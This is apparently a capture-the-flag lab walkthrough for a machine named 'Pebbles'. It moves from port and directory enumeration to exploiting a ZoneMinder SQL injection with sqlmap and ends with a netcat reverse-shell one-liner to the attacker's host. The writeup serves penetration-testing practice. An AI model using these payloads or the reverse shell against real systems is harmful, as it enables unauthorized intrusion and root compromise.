# Pebbles

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.52 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 11:01 +08
Nmap scan report for 192.168.157.52
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
```

FTP doesn't allow for anonymous connections.

### Web Enum -> SQL Shell

Port 80 shows a login page:

<figure><img src="../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

Default creds don't work, so I ran a `gobuster` scan while moving on. Port 3305 shows a default Apache page:

<figure><img src="../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

Ran a `gobuster` scan on this too while enumerating port 8080, which had Tomcat.

<figure><img src="../../../.gitbook/assets/image (3426).png" alt=""><figcaption></figcaption></figure>

Again we have no credentials. The `gobuster` scan revealed there was ZoneMinder on both ports:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.157.52/ -t 100       
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.157.52/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/16 11:03:22 Starting gobuster in directory enumeration mode
===============================================================
/zm                   (Status: 301) [Size: 320] [-> http://192.168.157.52/zm/]
```

<figure><img src="../../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

This version had an SQL Injection exploit:

```
$ searchsploit zoneminder
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ZoneMinder 1.24.3 - Remote File Inclusion                  | php/webapps/17593.txt
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injectio | php/webapps/41239.txt
ZoneMinder 1.32.3 - Cross-Site Scripting                   | php/webapps/47060.txt
ZoneMinder Video Server - packageControl Command Execution | unix/remote/24310.rb
----------------------------------------------------------- ---------------------------------
```

Here's the exploit:

```
2)SQL Injection
Example Url:http://192.168.241.131/zm/index.php
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
    Payload: view=request&request=log&task=query&limit=100;(SELECT *
FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
Easy exploitable using sqlmap.
```

I proxied the request using Burp and passed it to `sqlmap` with the `--os-shell` flag.&#x20;

```http
POST /zm/index.php HTTP/1.1
Host: 192.168.157.52
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Request: JSON
Content-type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 223
Origin: http://192.168.157.52:3305
Connection: close
Referer: http://192.168.157.52:3305/zm/
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=ka9o8an3bglpu52fkcghrjvhd6

view=request&request=log&task=query&limit=100&minTime=1466674406.084434
```

This found the `limit` variable to be vulnerable to SQL Injection and I got a webshell as `root`. We can then get a reverse shell easily after choosing the **64-bit database management option**.

```
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.196 3305 >/tmp/f
```

<figure><img src="../../../.gitbook/assets/image (2997).png" alt=""><figcaption></figcaption></figure>
